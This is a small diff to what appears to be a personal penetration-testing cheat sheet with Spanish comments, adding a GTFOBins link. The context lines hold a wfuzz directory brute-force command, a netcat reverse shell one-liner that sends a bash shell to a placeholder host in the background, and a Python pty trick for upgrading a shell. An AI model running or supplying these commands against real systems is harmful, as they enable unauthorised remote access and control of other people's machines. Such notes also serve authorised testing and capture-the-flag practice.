@@ -18,6 +18,7 @@ wfuzz -c --hc=404 -t 500 -w /usr/share/wordlists/dirbuster/directory-list-2.3-me
 
 ##REVERSE SHELL##
 nohup nc -e /bin/bash X.X.X.X 1234 & --> shell con proceso independiente
+https://gtfobins.github.io
 
 ##UPGRADE SHELL1##
 echo "import pty; pty.spawn('/bin/bash')" > /tmp/asdf.py
